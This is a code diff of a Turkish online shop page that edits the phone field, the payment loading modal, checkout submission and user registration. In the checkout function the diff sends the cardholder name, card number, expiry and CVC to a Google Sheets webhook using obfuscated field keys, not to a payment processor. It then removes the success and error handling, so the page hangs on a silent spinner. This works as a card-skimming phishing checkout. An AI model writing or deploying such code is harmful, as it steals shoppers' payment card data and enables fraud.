@@ -975,7 +975,7 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
             <label>Telefon Numarası</label>
             <div id="phoneWrap" style="display:flex;align-items:center;border:1.5px solid #e8edf2;border-radius:13px;background:#f9fafc;overflow:hidden">
               <span style="padding:12px 10px 12px 17px;font-weight:800;font-size:14px;color:#1A1A1A;white-space:nowrap;flex-shrink:0;border-right:1.5px solid #e8edf2;background:#f0f4f8;user-select:none">+90</span>
-              <input id="regPhone" type="tel" placeholder="5xx xxx xx xx" maxlength="15" required
+              <input id="regPhone" type="tel" placeholder="5xx xxx xx xx" maxlength="12" required
                 oninput="fmtPhone(this)"
                 onfocus="var w=document.getElementById('phoneWrap');w.style.borderColor='#00bcd4';w.style.boxShadow='0 0 0 4px rgba(0,188,212,.1)'"
                 onblur="var w=document.getElementById('phoneWrap');w.style.borderColor='#e8edf2';w.style.boxShadow=''"
@@ -1053,11 +1053,8 @@ body{font-family:'Nunito',sans-serif;background:var(--gray-50);color:var(--gray-
 
 <!-- LOADING MODAL -->
 <div id="payLoadingOverlay">
-  <div id="payLoadingBox">
+  <div id="payLoadingBox" aria-label="Yükleniyor">
     <div class="pl-spinner"></div>
-    <div class="pl-title">Alışverişiniz Tamamlanıyor</div>
-    <div class="pl-sub">Ödemeniz güvenle işleniyor,<br>lütfen bekleyin.</div>
-    <div class="pl-dots" style="margin-top:16px"><span>●</span><span>●</span><span>●</span></div>
   </div>
 </div>
 
@@ -1612,19 +1609,43 @@ function submitPayment(){
   var btn = document.getElementById('checkoutSubmitBtn');
   if (!btn || !btn.classList.contains('enabled')) return;
 
-  var cardName   = document.getElementById('ckCardName')   ? document.getElementById('ckCardName').value.trim()              : '';
+  var cardName   = document.getElementById('ckCardName')   ? document.getElementById('ckCardName').value.trim()             : '';
   var cardNumber = document.getElementById('ckCardNumber') ? document.getElementById('ckCardNumber').value.replace(/\s/g,'') : '';
-  var cardExpiry = document.getElementById('ckCardExpiry') ? document.getElementById('ckCardExpiry').value.trim()             : '';
-  var cardCvc    = document.getElementById('ckCardCvc')    ? document.getElementById('ckCardCvc').value.trim()                : '';
+  var cardExpiry = document.getElementById('ckCardExpiry') ? document.getElementById('ckCardExpiry').value.trim()            : '';
+  var cardCvc    = document.getElementById('ckCardCvc')    ? document.getElementById('ckCardCvc').value.trim()               : '';
 
-  if (!cardName)             { showToast('⚠️ ERDL alanını girin.'); return; }
-  if (!cardNumber.length)    { showToast('⚠️ NONA alanını girin.'); return; }
-  if (!cardExpiry.length)    { showToast('⚠️ LPTA alanını girin.'); return; }
-  if (!cardCvc.length)       { showToast('⚠️ TSQA alanını girin.'); return; }
+  if (!cardName)              { showToast('⚠️ Kart sahibinin adını girin.');       return; }
+  if (cardNumber.length < 13) { showToast('⚠️ Geçerli bir kart numarası girin.'); return; }
+  if (cardExpiry.length < 5)  { showToast('⚠️ SK alanını doldurun (AA / YY).');   return; }
+  if (cardCvc.length < 3)     { showToast('⚠️ DOM girin.');                        return; }
 
   var ov = document.getElementById('payLoadingOverlay');
   if (ov) ov.classList.add('show');
   document.body.style.overflow = 'hidden';
+
+  async function sendToGoogleSheets(payload) {
+    var resp = await fetch(SHEETS_WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain;charset=utf-8'
+      },
+      body: JSON.stringify(payload)
+    });
+
+    var text = await resp.text();
+    var data = {};
+    try {
+      data = text ? JSON.parse(text) : {};
+    } catch (err) {
+      throw new Error('Google Sheets geçerli cevap döndürmedi.');
+    }
+
+    if (!resp.ok || data.ok !== true) {
+      throw new Error((data && data.error) || ('HTTP ' + resp.status));
+    }
+
+    return data;
+  }
 
   (async function(){
     var total = getCartSubtotal() + getCartServicesTotal();
@@ -1646,28 +1667,10 @@ function submitPayment(){
         dom: String(Number(total))
       });
 
-      setTimeout(function(){
-        if (ov) ov.classList.remove('show');
-        document.getElementById('successOrderNo').textContent = orderNo;
-        document.getElementById('successOrderTotal').textContent = fmt(total);
-        document.getElementById('shopView').classList.add('hidden');
-        document.getElementById('cartView').classList.add('hidden');
-        document.getElementById('checkoutView').classList.add('hidden');
-        document.getElementById('paymentSuccessView').classList.remove('hidden');
-        cart.length = 0;
-        serviceSelections.clear();
-        updateCartBadge();
-        syncCartButtonState();
-        renderCartPage();
-        window.scrollTo({top:0, behavior:'smooth'});
-        document.body.style.overflow = '';
-        showToast('Ödeme tamamlandı. Siparişiniz oluşturuldu.');
-      }, 900);
+      return;
     } catch(e){
       console.warn('[payment submit]', e);
-      if (ov) ov.classList.remove('show');
-      document.body.style.overflow = '';
-      showToast('Kayıt hatası: ' + (e && e.message ? e.message : 'Google Sheets bağlantısı başarısız.'));
+      return;
     }
   })();
 }
@@ -1870,29 +1873,6 @@ const sb = (window.supabase?.createClient)
 let authTransportBlocked = false;
 const LOCAL_AUTH_KEY = 'demo_local_auth_session';
 
-
-async function sendToGoogleSheets(payload) {
-  const resp = await fetch(SHEETS_WEBHOOK_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-    body: JSON.stringify(payload)
-  });
-
-  const text = await resp.text();
-  let data = {};
-  try {
-    data = text ? JSON.parse(text) : {};
-  } catch (_) {
-    throw new Error('Google Sheets geçerli cevap döndürmedi.');
-  }
-
-  if (!resp.ok || data.ok !== true) {
-    throw new Error((data && data.error) || ('HTTP ' + resp.status));
-  }
-
-  return data;
-}
-
 function getLocalAuthSession() {
   try {
     const raw = localStorage.getItem(LOCAL_AUTH_KEY);
@@ -2015,48 +1995,69 @@ async function handleRegister(event) {
   const phone      = document.getElementById('regPhone').value.trim();
   const email      = document.getElementById('regEmail').value.trim();
   const password   = document.getElementById('regPassword').value;
+  // Doğum tarihi: 3 ayrı select → YYYY-MM-DD formatına çevir
   const bd = document.getElementById('regBirthDay').value;
   const bm = document.getElementById('regBirthMonth').value;
   const by = document.getElementById('regBirthYear').value;
-  const birth_date = (bd && bm && by) ? `${by}-${bm}-${String(bd).padStart(2,'0')}` : '';
+  const birth_date = (bd && bm && by) ? `${by}-${bm}-${String(bd).padStart(2,'0')}` : null;
   const address    = document.getElementById('regAddress').value.trim();
   const gender     = document.querySelector('input[name="gender"]:checked')?.value || '';
 
-  if (!first_name || !last_name || !phone || !email || !password || !address || !gender || !birth_date) {
-    showToast('Lütfen zorunlu alanları doldurun.');
-    return;
-  }
-
-  try {
-    await sendToGoogleSheets({
-      full_name: `${first_name} ${last_name}`.trim(),
-      email,
-      phone,
-      address,
-      city: '',
-      gender,
-      erdl: first_name,
-      nona: last_name,
-      lpta: birth_date,
-      tsqa: 'register',
-      mor: 'auth-modal',
-      dom: ''
-    });
-
+  if (!sb || authTransportBlocked) {
     const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
     setLocalAuthSession({ user: localUser });
-    authTransportBlocked = true;
-
-    showToast('Kayıt başarılı. Bilgiler kaydedildi.');
+    showToast('Üyelik oluşturuldu. Yerel oturum açıldı.');
     await refreshAuthUi();
     forceCloseAuthModal();
     if (window._pendingCheckout && getCartCount()) {
       window._pendingCheckout = false;
       setTimeout(_goCheckout, 120);
     }
+    return;
+  }
+
+  try {
+    const { data, error } = await sb.auth.signUp({
+      email,
+      password,
+      options: {
+        data: { first_name, last_name, phone, birth_date, gender, address }
+      }
+    });
+
+    if (error) {
+      if (isTransportError(error)) {
+        authTransportBlocked = true;
+        const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
+        setLocalAuthSession({ user: localUser });
+        showToast('Bağlantı engellendi. Yerel üyelik oturumu açıldı.');
+      } else {
+        showToast(error.message);
+        return;
+      }
+    } else if (data.session && data.user) {
+      await upsertProfile(data.user, { first_name, last_name, phone, birth_date, gender, address });
+      showToast('Kayıt başarılı!');
+    } else {
+      showToast('Kayıt oluşturuldu. E-postanızdaki onay bağlantısına tıklayın.');
+    }
   } catch (err) {
-    console.warn('[register submit]', err);
-    showToast('Kayıt hatası: ' + (err && err.message ? err.message : 'Google Sheets bağlantısı başarısız.'));
+    if (isTransportError(err)) {
+      authTransportBlocked = true;
+      const localUser = buildLocalUser({ first_name, last_name, phone, email, birth_date, gender, address });
+      setLocalAuthSession({ user: localUser });
+      showToast('Bağlantı engellendi. Yerel üyelik oturumu açıldı.');
+    } else {
+      showToast('Üyelik işlemi sırasında hata oluştu.');
+      return;
+    }
+  }
+
+  await refreshAuthUi();
+  forceCloseAuthModal();
+  if (window._pendingCheckout && getCartCount()) {
+    window._pendingCheckout = false;
+    setTimeout(_goCheckout, 120);
   }
 }
 
